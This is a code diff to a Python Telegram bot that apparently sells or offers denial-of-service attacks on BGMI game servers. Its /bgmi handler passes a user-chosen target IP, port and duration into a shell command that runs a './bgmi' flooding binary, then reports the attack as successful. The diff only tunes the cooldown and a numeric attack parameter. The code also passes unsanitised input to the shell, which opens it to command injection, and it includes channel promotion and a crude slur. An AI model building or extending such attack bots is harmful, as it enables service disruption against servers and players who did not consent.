@@ -285,7 +285,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Join :- @MrHellenG # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds <50:
-                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗢𝗻 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 . BSDK AB 𝗪𝗮𝗶𝘁 100 Seconds 𝗕𝗲𝗳𝗼𝗿𝗲 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗧𝗵𝗲 /bgmi 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗔𝗴𝗮𝗶𝗻."
+                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗢𝗻 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 . BSDK AB 𝗪𝗮𝗶𝘁 50 Seconds 𝗕𝗲𝗳𝗼𝗿𝗲 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗧𝗵𝗲 /bgmi 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗔𝗴𝗮𝗶𝗻."
                 bot.reply_to(message, response)
                 return
             # Join :- @MrHellenG # Update the last time the user ran the command
@@ -302,7 +302,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Join :- @MrHellenG# Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 900"
+                full_command = f"./bgmi {target} {port} {time} 100"
                 subprocess.run(full_command, shell=True)
                 response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 ☄️ {target}:{port}\n🎉𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🎊𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮🥳"
         else:
